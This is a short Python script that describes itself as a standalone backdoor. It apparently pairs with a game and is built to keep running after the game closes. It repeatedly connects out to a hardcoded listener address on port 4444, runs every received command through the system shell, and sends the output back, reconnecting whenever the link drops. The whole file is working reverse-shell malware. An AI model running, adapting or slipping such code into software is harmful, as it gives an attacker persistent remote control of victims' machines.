#!/usr/bin/env python3
"""
Standalone backdoor that runs independently of the game
Keeps running even after game closes
Auto-reconnects if connection is lost
"""
import socket
import subprocess
import time
import sys

# Configuration
LISTENER_HOST = '10.12.72.171'
LISTENER_PORT = 4444
RECONNECT_DELAY = 5  # seconds

def run_backdoor():
    """Main backdoor loop with auto-reconnect"""
    print(f"[*] Backdoor starting...")
    print(f"[*] Will connect to {LISTENER_HOST}:{LISTENER_PORT}")
    
    while True:
        try:
            print(f"[*] Attempting connection...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((LISTENER_HOST, LISTENER_PORT))
            print(f"[+] Connected to {LISTENER_HOST}:{LISTENER_PORT}")
            
            # Connection established, handle commands
            while True:
                try:
                    cmd = sock.recv(1024).decode().strip()
                    
                    if not cmd:
                        print("[-] Connection closed by listener")
                        break
                    
                    if cmd.lower() == 'exit':
                        print("[*] Exit command received")
                        sock.send(b"Exiting...\n")
                        sock.close()
                        return
                    
                    print(f"[*] Executing: {cmd}")
                    
                    # Execute command
                    try:
                        output = subprocess.check_output(
                            cmd,
                            shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=30
                        )
                        sock.send(output)
                    except subprocess.TimeoutExpired:
                        sock.send(b"Command timed out\n")
                    except Exception as e:
                        sock.send(f"Error: {str(e)}\n".encode())
                
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Error in command loop: {e}")
                    break
            
            sock.close()
            
        except socket.timeout:
            print(f"[-] Connection timeout")
        except ConnectionRefusedError:
            print(f"[-] Connection refused (listener not running?)")
        except Exception as e:
            print(f"[-] Connection error: {e}")
        
        # Wait before reconnecting
        print(f"[*] Waiting {RECONNECT_DELAY} seconds before reconnecting...")
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    try:
        run_backdoor()
    except KeyboardInterrupt:
        print("\n[*] Backdoor stopped by user")
        sys.exit(0)
